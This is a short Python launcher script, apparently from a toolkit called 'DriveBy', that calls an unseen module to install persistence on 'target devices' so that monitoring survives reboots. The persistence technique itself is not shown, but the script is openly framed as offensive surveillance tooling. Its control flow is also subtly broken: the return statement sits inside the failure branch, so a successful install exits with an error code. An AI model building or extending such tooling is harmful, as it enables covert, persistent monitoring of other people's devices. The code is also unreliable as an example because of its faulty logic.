#!/usr/bin/env python3
"""
DriveBy Persistence Installer
Simple script to install persistence mechanisms on target devices
"""

import sys
import os
from pathlib import Path

# Add current directory to path
sys.path.insert(0, str(Path(__file__).parent))

def main():
    """Main persistence installer"""
    try:
        # Import persistence system
        from persistence import install_persistence

        print(" Installing DriveBy persistence...")

        # Install persistence for current platform
        success = install_persistence()

        if success:
            print(" Persistence installed successfully")
            print(" Monitoring will restart automatically after reboot")
        else:
            print(" Persistence installation failed")

            return success

    except ImportError as e:
        print(f" Failed to import persistence system: {e}")
        return False
    except Exception as e:
        print(f" Persistence installation error: {e}")
        return False
if __name__ == "__main__":
                success = main()
                sys.exit(0 if success else 1)
